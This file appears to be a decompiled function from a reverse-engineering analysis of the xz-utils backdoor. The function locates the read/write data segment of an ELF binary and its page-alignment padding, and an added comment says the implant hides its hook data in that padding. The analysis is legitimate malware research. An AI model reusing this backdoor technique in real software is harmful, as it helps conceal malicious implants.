// /home/kali/xzre-ghidra/xzregh/102150_elf_get_data_segment.c
// Function: elf_get_data_segment @ 0x102150
// Calling convention: __stdcall
// Prototype: void * __stdcall elf_get_data_segment(elf_info_t * elf_info, u64 * pSize, BOOL get_alignment)


/*
 * AutoDoc: Walks every PT_LOAD segment looking for the last read/write mapping (PF_W|PF_R). Once found it caches three pieces of information: the base of the mapped data (`data_segment_start`), the amount of padding between the end of the file-backed bytes and the next page boundary (`data_segment_alignment`), and the total size of the aligned segment. Callers either request the true segment span (`get_alignment == FALSE`) or the padding region (when TRUE), which is where the implant later tucks the `backdoor_hooks_data_t` structure.
 */
#include "xzre_types.h"


void * elf_get_data_segment(elf_info_t *elf_info,u64 *pSize,BOOL get_alignment)

{
  Elf64_Ehdr *pEVar1;
  BOOL data_segment_found;
  ulong uVar3;
  Elf64_Phdr *pEVar4;
  void *pvVar5;
  void *pvVar6;
  u64 uVar7;
  ulong uVar8;
  ulong uVar9;
  void *pvVar10;
  ulong uVar11;
  ulong uVar12;
  long lVar13;
  
  pvVar6 = (void *)elf_info->data_segment_start;
  pEVar1 = elf_info->elfbase;
  if (pvVar6 != (void *)0x0) {
    if (get_alignment != FALSE) {
      uVar7 = elf_info->data_segment_alignment;
      *pSize = uVar7;
      pvVar6 = (void *)((long)pvVar6 - uVar7);
      if (uVar7 == 0) {
        pvVar6 = (void *)0x0;
      }
      return pvVar6;
    }
    *pSize = elf_info->data_segment_size;
    return pvVar6;
  }
  data_segment_found = FALSE;
  lVar13 = 0;
  uVar8 = 0;
  uVar3 = 0;
  for (uVar11 = 0; (uint)uVar11 < (uint)(ushort)elf_info->e_phnum; uVar11 = uVar11 + 1) {
    pEVar4 = elf_info->phdrs + uVar11;
    if ((pEVar4->p_type == 1) && ((pEVar4->p_flags & 7) == 6)) {
      if (pEVar4->p_memsz < pEVar4->p_filesz) {
        return (void *)0x0;
      }
      uVar9 = (long)pEVar1 + (pEVar4->p_vaddr - elf_info->first_vaddr);
      uVar12 = pEVar4->p_memsz + uVar9;
      uVar9 = uVar9 & 0xfffffffffffff000;
      if ((uVar12 & 0xfff) != 0) {
        uVar12 = (uVar12 & 0xfffffffffffff000) + 0x1000;
      }
      if (data_segment_found) {
        if (uVar8 + lVar13 < uVar12) {
          lVar13 = uVar12 - uVar9;
          uVar3 = uVar11 & 0xffffffff;
          uVar8 = uVar9;
        }
      }
      else {
        lVar13 = uVar12 - uVar9;
        data_segment_found = TRUE;
        uVar3 = uVar11 & 0xffffffff;
        uVar8 = uVar9;
      }
    }
  }
  if (data_segment_found) {
    pEVar4 = elf_info->phdrs;
    lVar13 = pEVar4[uVar3].p_vaddr - elf_info->first_vaddr;
    pvVar10 = (void *)((long)pEVar1 + pEVar4[uVar3].p_memsz + lVar13);
    pvVar5 = (void *)((long)pEVar1 + pEVar4[uVar3].p_filesz + lVar13);
    pvVar6 = pvVar10;
    if (((ulong)pvVar10 & 0xfff) != 0) {
      pvVar6 = (void *)(((ulong)pvVar10 & 0xfffffffffffff000) + 0x1000);
    }
    uVar7 = (long)pvVar6 - (long)pvVar10;
    elf_info->data_segment_start = (u64)pvVar5;
    elf_info->data_segment_alignment = uVar7;
    elf_info->data_segment_size = (long)pvVar6 - (long)pvVar5;
    if (get_alignment == FALSE) {
      *pSize = (long)pvVar6 - (long)pvVar5;
      return pvVar5;
    }
    *pSize = uVar7;
    if (uVar7 != 0) {
      return pvVar10;
    }
  }
  return (void *)0x0;
}

